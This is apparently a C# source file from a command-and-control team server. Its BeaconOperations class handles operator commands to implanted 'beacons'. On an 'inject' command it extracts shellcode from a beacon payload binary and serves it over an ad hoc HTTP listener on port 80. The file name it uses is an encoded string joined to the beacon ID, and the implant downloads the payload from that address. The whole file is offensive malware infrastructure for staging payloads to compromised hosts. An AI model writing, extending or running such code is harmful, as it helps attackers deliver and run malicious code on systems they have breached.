using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Listeners;

namespace TeamServer
{
    internal class BeaconOperations
    {

        public class HostedFile
        {
            public string fileName = "";
            public byte[] content;

            public HostedFile(string fileName, byte[] content)
            {
                this.fileName = fileName;
                this.content = content;
            }
        }

        public static bool HandleOperation(Beacon beacon, string command)
        {
            command = command.Trim();
            if (command == "bg" || command == "background")
            {
                return false;
            }

            if (command.StartsWith("inject"))
            {
                string beaconPath = Path.Combine(Program.config["payloadDirectory"], "Beacon.shc.exe");
                byte[] shellcode = BinaryUtils.getShellcodeFromBinary(beaconPath);
                HostData(beacon, shellcode);
            }

            beacon.InsertCommand(command);
            return true;
        }

        public static void HostData(Beacon beacon, byte[] content)
        {
            string fileName = "eW91bGl0dGxlY3VyaW91c3NoaXQ" + beacon.Id;
            // add hosted files
            CustomHttpListener.hostedFiles.Add(new HostedFile(fileName, content));

            if (!CustomHttpListener.httpExists)
            {
                IListener foundListener = null;
                // SEARCH FOR LISTENERS
                for (int i = 0; i < Program.listeners.Count; i++)
                {
                    if (Program.listeners[i].Beacons.Contains(beacon))
                    {
                        foundListener = Program.listeners[i];
                        break;
                    }
                }

                HttpListener listener = new HttpListener();

                listener.Prefixes.Add("http://" + foundListener.Ip + ":80/");

                listener.Start();
                Task listenerTask = null;

                Func<Task> listenerHandler = async () =>
                {
                    while (true)
                    {
                        HttpListenerContext context = listener.GetContext();
                        HttpListenerRequest req = context.Request;

                        string data;
                        byte[] buffer;
                        Stream ros;

                        List<string> uriSegments = new List<string>(req.Url.Segments);

                        using HttpListenerResponse resp = context.Response;

                        if (uriSegments.Count == 2)
                        {
                            // get the beacon ID
                            string id = uriSegments.Last();

                            HostedFile hostedFile = null;
                            for(int i = 0; i < CustomHttpListener.hostedFiles.Count; i++)
                            {
                                if (CustomHttpListener.hostedFiles[i].fileName == id)
                                {
                                    hostedFile = CustomHttpListener.hostedFiles[i];
                                }
                            }

                            if (hostedFile != null)
                            {
                                resp.Headers.Set("Content-Type", "text/plain");

                                buffer = hostedFile.content;

                                ros = resp.OutputStream;
                                ros.Write(buffer, 0, buffer.Length);
                                ros.Close();

                                CustomHttpListener.hostedFiles.Remove(hostedFile);
                                listener.Stop();
                            }
                        }
                    }
                };

                listenerTask = Task.Run(listenerHandler);
            }
        }
    }
}
